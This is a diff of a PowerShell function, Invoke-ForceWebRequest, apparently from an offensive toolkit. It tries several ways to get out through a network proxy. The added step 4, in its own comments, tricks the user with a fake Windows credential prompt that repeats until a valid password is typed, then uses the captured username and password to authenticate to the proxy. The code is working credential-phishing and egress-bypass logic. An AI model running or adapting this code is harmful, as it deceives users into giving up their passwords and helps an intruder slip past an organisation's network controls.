@@ -149,7 +149,7 @@ function Invoke-ForceWebRequest {
         $proxy_pac_regex    = "PROXY\s+(?<proxy>[A-Za-z0-9\.]+\:\d{1,5})"
 
         # 2: basic-server webrequest
-        Write-Verbose "Trying http get with method #2: simple request with just URL proxy ($proxy_server)..."
+        Write-Verbose "Trying http get with method #2: request with just URL proxy ($proxy_server)..."
         $request = Invoke-BasicWebRequest $DummyURL -ProxyURL $proxy_server
         if ($request | select -first 1 | % { $_.content -match $DummyString }) { return }
 
@@ -163,7 +163,7 @@ function Invoke-ForceWebRequest {
                     # request dummystring for each proxy-url
                     $proxy_server_pac = $_.Groups["proxy"].Value
 
-                    Write-Verbose "Trying http get with method #3: simple request with just URL proxy from .pac file ($proxy_server_pac)..."
+                    Write-Verbose "Trying http get with method #3: request with just URL proxy from .pac file ($proxy_server_pac)..."
                     $request = Invoke-BasicWebRequest $DummyURL -ProxyURL $proxy_server_pac
                     if ($request | select -first 1 | % { $_.content -match $DummyString }) { return }
                 }
@@ -173,7 +173,33 @@ function Invoke-ForceWebRequest {
         # 4: at this point, we need to trick the user with a fake credential request.
         #    the credential window will be the Windows original one, so user should not suspect of a malicious activity.
         #    user will be prompt until he/she writes a valid credential. 
-        
+        Invoke-LoginPrompt | ForEach-Object {
+            $username   = $_.UserName
+            $password   = $_.Password
+            Write-Verbose "We have the credentials of $username user!"
+
+            # 4.1: request with the default proxy URL and credentials.
+            Write-Verbose "Trying http get with method #4.1: request with URL proxy ($proxy_server) and $username credential..."
+            $request = Invoke-BasicWebRequest $DummyURL -ProxyURL $proxy_server -ProxyUser $username -ProxyPassword $password
+            if ($request | select -first 1 | % { $_.content -match $DummyString }) { return }
+
+            # 4.2: request with the .pac proxys URLs and credentials.
+            if ($proxy_auto_url -ne $null) {
+                $proxy_pac_config   = (New-Object System.Net.WebClient).DownloadString($proxy_auto_url)
+                
+                if ($proxy_pac_config -ne $null) {
+                    # iterate through each proxy url match:
+                    $proxy_pac_config | Select-String $proxy_pac_regex -AllMatches | % { $_.Matches } | % { 
+                        # request dummystring for each proxy-url
+                        $proxy_server_pac = $_.Groups["proxy"].Value
+
+                        Write-Verbose "Trying http get with method #4.1: request with URL proxy from .pac file ($proxy_server_pac) and $username credential..."
+                        $request = Invoke-BasicWebRequest $DummyURL -ProxyURL $proxy_server_pac -ProxyUser $username -ProxyPassword $password
+                        if ($request | select -first 1 | % { $_.content -match $DummyString }) { return }
+                    }
+                }
+            }
+        }
     }
     end { $request }
 }
